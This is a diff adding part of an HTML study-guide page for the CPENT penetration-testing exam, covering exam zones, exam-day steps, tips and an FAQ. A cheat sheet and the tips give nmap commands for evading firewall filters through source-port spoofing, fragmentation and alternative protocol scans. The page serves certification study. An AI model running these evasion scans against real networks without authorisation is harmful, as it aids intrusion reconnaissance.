+                        <li>Buffer overflow, format string, ROP chains</li>
+                        <li>ASLR/NX/PIE bypass</li>
+                        <li>Shellcode development</li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- IoT Zone -->
+            <div class="module-card reveal" data-module="iot">
+                <div class="module-header">
+                    <div class="module-icon green"><i class="fas fa-microchip"></i></div>
+                    <div>
+                        <div class="module-number">Zone 3</div>
+                        <div class="module-title">IoT</div>
+                    </div>
+                </div>
+                <div class="module-desc">IoT device exploitation, firmware reverse engineering, hardcoded credentials.</div>
+                <div class="module-topics">
+                    <span class="topic-tag">Firmware Analysis</span>
+                    <span class="topic-tag">Hardcoded Creds</span>
+                    <span class="topic-tag">IoT Protocols</span>
+                    <span class="topic-tag">Web Interfaces</span>
+                </div>
+                <button class="expand-btn" onclick="toggleExpand(this)">View Details <i class="fas fa-chevron-down"></i></button>
+                <div class="module-details">
+                    <h4>What to Expect:</h4>
+                    <ul>
+                        <li>Identify IoT targets and map attack surface</li>
+                        <li>Gain access to IoT devices</li>
+                        <li>Extract and reverse engineer firmware</li>
+                        <li>Find hardcoded credentials in code (PHP, etc.)</li>
+                        <li>Answer questions from firmware analysis</li>
+                    </ul>
+                    <h4>Tools:</h4>
+                    <ul>
+                        <li>binwalk, Firmwalker, Ghidra, web browser</li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- Web Zone -->
+            <div class="module-card reveal" data-module="web">
+                <div class="module-header">
+                    <div class="module-icon blue"><i class="fas fa-globe"></i></div>
+                    <div>
+                        <div class="module-number">Zone 4</div>
+                        <div class="module-title">Web Applications</div>
+                    </div>
+                </div>
+                <div class="module-desc">Web vulnerabilities, misconfigurations, server exploitation, secret key discovery.</div>
+                <div class="module-topics">
+                    <span class="topic-tag">OWASP Top 10</span>
+                    <span class="topic-tag">Server Exploitation</span>
+                    <span class="topic-tag">Misconfigurations</span>
+                    <span class="topic-tag">Secret Keys</span>
+                </div>
+                <button class="expand-btn" onclick="toggleExpand(this)">View Details <i class="fas fa-chevron-down"></i></button>
+                <div class="module-details">
+                    <h4>What to Expect:</h4>
+                    <ul>
+                        <li>Multiple web application vulnerabilities</li>
+                        <li>Security misconfigurations to exploit</li>
+                        <li>Own the servers through web attacks</li>
+                        <li>Find secret keys placed on compromised servers</li>
+                        <li>SQLi, XSS, SSRF, file upload, command injection</li>
+                    </ul>
+                    <h4>Key Focus:</h4>
+                    <ul>
+                        <li>OWASP Top 10 mastery</li>
+                        <li>Burp Suite workflow</li>
+                        <li>Manual + automated testing</li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- CTF Zone -->
+            <div class="module-card reveal" data-module="ctf">
+                <div class="module-header">
+                    <div class="module-icon purple"><i class="fas fa-flag"></i></div>
+                    <div>
+                        <div class="module-number">Zone 5</div>
+                        <div class="module-title">CTF Challenges</div>
+                    </div>
+                </div>
+                <div class="module-desc">Linux/web misconfigs, pivoting through internal networks, finding flags.</div>
+                <div class="module-topics">
+                    <span class="topic-tag">Linux Misconfigs</span>
+                    <span class="topic-tag">Web Misconfigs</span>
+                    <span class="topic-tag">Pivoting</span>
+                    <span class="topic-tag">Internal Network</span>
+                </div>
+                <button class="expand-btn" onclick="toggleExpand(this)">View Details <i class="fas fa-chevron-down"></i></button>
+                <div class="module-details">
+                    <h4>What to Expect:</h4>
+                    <ul>
+                        <li>Linux and web-based environment challenges</li>
+                        <li>Security misconfigurations to exploit</li>
+                        <li>Own servers and find secret keys</li>
+                        <li>Pivot through internal network</li>
+                        <li>Traverse network segments</li>
+                    </ul>
+                    <h4>Key Skills:</h4>
+                    <ul>
+                        <li>Linux privilege escalation</li>
+                        <li>Service exploitation</li>
+                        <li>Tunneling and port forwarding</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Exam Process Section -->
+    <section id="exam-process">
+        <div class="section-header reveal">
+            <div class="section-tag">Process</div>
+            <h2>Exam Day Process</h2>
+            <p>Follow these steps on your exam day. Know what to expect.</p>
+        </div>
+
+        <div class="timeline">
+            <div class="timeline-item reveal">
+                <div class="timeline-dot"></div>
+                <div class="timeline-content">
+                    <div class="timeline-week">Step 1</div>
+                    <h3>Prepare Environment</h3>
+                    <p>Test your VM (Kali/Parrot), OpenVPN, webcam, and internet connection. Ensure stable 5Mbps+ connection. Use wired connection if possible.</p>
+                </div>
+            </div>
+            <div class="timeline-item reveal">
+                <div class="timeline-dot"></div>
+                <div class="timeline-content">
+                    <div class="timeline-week">Step 2</div>
+                    <h3>Connect to Proctor</h3>
+                    <p>Go to proctor.examspecialists.com → My Sessions → Click Start Exam. Wait for countdown to reach all zeros. Proctor will guide you.</p>
+                </div>
+            </div>
+            <div class="timeline-item reveal">
+                <div class="timeline-dot"></div>
+                <div class="timeline-content">
+                    <div class="timeline-week">Step 3</div>
+                    <h3>Build Exam Range</h3>
+                    <p>Click "Prepare Exam Range" on dashboard. Takes ~5 minutes to setup. Download VPN credentials and import to OpenVPN client.</p>
+                </div>
+            </div>
+            <div class="timeline-item reveal">
+                <div class="timeline-dot"></div>
+                <div class="timeline-content">
+                    <div class="timeline-week">Step 4</div>
+                    <h3>Launch Exam</h3>
+                    <p>Proctor unlocks exam with credentials. Timer starts immediately. You now have 24 hours (or 12 if split session).</p>
+                </div>
+            </div>
+            <div class="timeline-item reveal">
+                <div class="timeline-dot"></div>
+                <div class="timeline-content">
+                    <div class="timeline-week">Step 5</div>
+                    <h3>Attack & Document</h3>
+                    <p>Exploit targets across all zones. Take screenshots of everything. Document findings as you go — don't wait until the end!</p>
+                </div>
+            </div>
+            <div class="timeline-item reveal">
+                <div class="timeline-dot"></div>
+                <div class="timeline-content">
+                    <div class="timeline-week">Step 6</div>
+                    <h3>Submit Flags</h3>
+                    <p>Mark challenges complete as you find flags. Verify all submissions before finishing your session.</p>
+                </div>
+            </div>
+            <div class="timeline-item reveal">
+                <div class="timeline-dot"></div>
+                <div class="timeline-content">
+                    <div class="timeline-week">Step 7</div>
+                    <h3>Write Report</h3>
+                    <p>Download templates from dashboard. Write professional report with all findings. Submit before 30-day window expires.</p>
+                </div>
+            </div>
+            <div class="timeline-item reveal">
+                <div class="timeline-dot"></div>
+                <div class="timeline-content">
+                    <div class="timeline-week">Step 8</div>
+                    <h3>Check Results</h3>
+                    <p>Results available within 7 working days after report submission. Check CPENT Exam Status on dashboard.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Critical Exam Tips Section -->
+    <section id="exam-tips">
+        <div class="section-header reveal">
+            <div class="section-tag">Critical</div>
+            <h2>Official Exam Tips</h2>
+            <p>These insights from EC-Council will help you avoid common mistakes.</p>
+        </div>
+
+        <div class="tips-grid">
+            <div class="tip-card reveal" style="border-color: var(--accent-red);">
+                <div class="tip-number" style="color: var(--accent-red);">!</div>
+                <h3>Don't Use Default Scans</h3>
+                <p>Default Nmap scans are too aggressive and may get filtered. Use slow, controlled scans (-T2, -T3). Fine-tune your approach when filtering exists.</p>
+            </div>
+            <div class="tip-card reveal" style="border-color: var(--accent-red);">
+                <div class="tip-number" style="color: var(--accent-red);">!</div>
+                <h3>Interpret Network Responses</h3>
+                <p>A "closed" port response means the machine is live. "Filtered" means unreachable. Analyze ICMP Type 3 Code 13 responses — they reveal Cisco routers.</p>
+            </div>
+            <div class="tip-card reveal" style="border-color: var(--accent-red);">
+                <div class="tip-number" style="color: var(--accent-red);">!</div>
+                <h3>Identify Filtering Mechanisms</h3>
+                <p>Determine what's filtering: Router? Firewall? IPTables? Stateful vs Stateless? Each requires different bypass techniques.</p>
+            </div>
+            <div class="tip-card reveal" style="border-color: var(--accent-orange);">
+                <div class="tip-number" style="color: var(--accent-orange);">!</div>
+                <h3>Map the Attack Surface</h3>
+                <p>Before exploiting, understand the full network. Build a target database. Identify machines of interest and prioritize by access complexity.</p>
+            </div>
+            <div class="tip-card reveal" style="border-color: var(--accent-orange);">
+                <div class="tip-number" style="color: var(--accent-orange);">!</div>
+                <h3>Go Deeper</h3>
+                <p>Things may not be obvious. If a subnet shows no targets, it may be unreachable. Experiment with different protocols. Try source port manipulation.</p>
+            </div>
+            <div class="tip-card reveal" style="border-color: var(--accent-orange);">
+                <div class="tip-number" style="color: var(--accent-orange);">!</div>
+                <h3>Weak Firewall Rules</h3>
+                <p>If ICMP unreachable messages aren't blocked, the admin made a mistake. Document it! Use source port 20 (FTP data) to bypass stateless filters.</p>
+            </div>
+        </div>
+
+        <!-- Filter Bypass Techniques -->
+        <div class="cheatsheet-card reveal" style="margin-top: 3rem; max-width: 800px; margin-left: auto; margin-right: auto;">
+            <div class="cheatsheet-header">
+                <i class="fas fa-shield-alt"></i>
+                <h3>Stateless Filter Bypass Techniques</h3>
+            </div>
+            <div class="cheatsheet-body">
+                <pre><code># Step 1: Detect filter with ICMP
+nmap -Pn -sA target_ip
+# Look for ICMP Type 3 Code 13 = Cisco Router
+
+# Step 2: Map rules with source port
+nmap -Pn --source-port 21 target_ip  # FTP data port
+nmap -Pn --source-port 53 target_ip  # DNS
+nmap -Pn --source-port 88 target_ip  # Kerberos
+
+# Step 3: Fragmentation
+nmap -Pn -f --source-port 21 target_ip
+
+# Step 4: Alternative protocols
+nmap -Pn -sY target_ip  # SCTP
+nmap -Pn -sO target_ip  # IP protocol scan</code></pre>
+            </div>
+        </div>
+    </section>
+
+    <!-- FAQ Section -->
+    <section id="faq">
+        <div class="section-header reveal">
+            <div class="section-tag">Questions</div>
+            <h2>Frequently Asked Questions</h2>
+            <p>Common questions about the CPENT exam.</p>
+        </div>
+
+        <div class="faq-container">
+            <div class="faq-item reveal">
+                <div class="faq-question">
+                    What is the CPENT exam exactly?
+                    <i class="fas fa-chevron-down"></i>
+                </div>
+                <div class="faq-answer">
+                    <p>CPENT (Certified Penetration Testing Engineer) is EC-Council's hands-on practical certification. Unlike CEH which is theory-based, CPENT requires you to actually exploit systems, pivot through networks, and write a professional report. It's designed to prove you can perform real penetration testing.</p>
+                </div>
+            </div>
+
+            <div class="faq-item reveal">
+                <div class="faq-question">
+                    How is CPENT different from CEH?
+                    <i class="fas fa-chevron-down"></i>
+                </div>
+                <div class="faq-answer">
+                    <p>CEH is primarily multiple-choice theory. CPENT is 100% practical — you get a live network to attack. CPENT covers more advanced topics like binary exploitation, OT/SCADA, and cloud pentesting. Many employers value CPENT more for hands-on roles.</p>
+                </div>
+            </div>
+
+            <div class="faq-item reveal">
+                <div class="faq-question">
+                    Can I use Metasploit in the exam?
+                    <i class="fas fa-chevron-down"></i>
+                </div>
+                <div class="faq-answer">
+                    <p>Yes! Metasploit is allowed and encouraged. You also have access to Kali Linux tools. However, you should also know manual techniques since some challenges may require custom exploitation.</p>
+                </div>
+            </div>
+
+            <div class="faq-item reveal">
+                <div class="faq-question">
+                    How many targets are in the exam?
+                    <i class="fas fa-chevron-down"></i>
+                </div>
+                <div class="faq-answer">
+                    <p>The exam typically includes multiple machines across different networks. You'll need to exploit initial access, escalate privileges, and pivot to other subnets. The exact number varies but expect 3-5+ systems.</p>
+                </div>
+            </div>
+
+            <div class="faq-item reveal">
+                <div class="faq-question">
+                    Is report writing really that important?
+                    <i class="fas fa-chevron-down"></i>
+                </div>
+                <div class="faq-answer">
+                    <p>Absolutely! Report writing accounts for a significant portion of your score. You can exploit every machine but still fail if your report is poor. The report must be professional, include PoCs, screenshots, CVSS scores, and actionable remediation.</p>
+                </div>
+            </div>
+
+            <div class="faq-item reveal">
+                <div class="faq-question">
+                    How should I prepare?
+                    <i class="fas fa-chevron-down"></i>
+                </div>
+                <div class="faq-answer">
+                    <p>Practice on HackTheBox, TryHackMe, and VulnHub. Master Linux/Windows privesc, AD attacks, and web app testing. Set up a home lab with vulnerable VMs. Practice writing reports for every machine you compromise. Follow the 8-week study plan on this site.</p>
+                </div>
+            </div>
+
+            <div class="faq-item reveal">
+                <div class="faq-question">
+                    Can I retake the exam if I fail?
+                    <i class="fas fa-chevron-down"></i>
+                </div>
+                <div class="faq-answer">
+                    <p>Yes. EC-Council allows retakes but you'll need to pay the exam fee again. There's no waiting period between attempts. Review your weaknesses, practice more, and try again.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer>
+        <p>CPENT Study Guide | Built for aspiring penetration testers</p>
+        <p style="margin-top: 0.5rem;">Good luck on your exam! Remember: practice makes permanent.</p>
+        <div style="margin-top: 2rem; padding-top: 1.5rem; border-top: 1px solid var(--border); display: flex; align-items: center; justify-content: center; gap: 0.5rem; flex-wrap: wrap;">
+            <span style="color: var(--text-muted);">Developed by</span>
+            <a href="https://www.linkedin.com/in/jojin-john/" target="_blank" style="color: var(--accent); text-decoration: none; font-weight: 600; display: inline-flex; align-items: center; gap: 0.4rem; transition: all 0.3s;">
+                <i class="fab fa-linkedin" style="font-size: 1rem;"></i>
+                JOJIN JOHN
+            </a>
+        </div>
+    </footer>
+
+    <script src="script.js"></script>
+</body>
+</html>
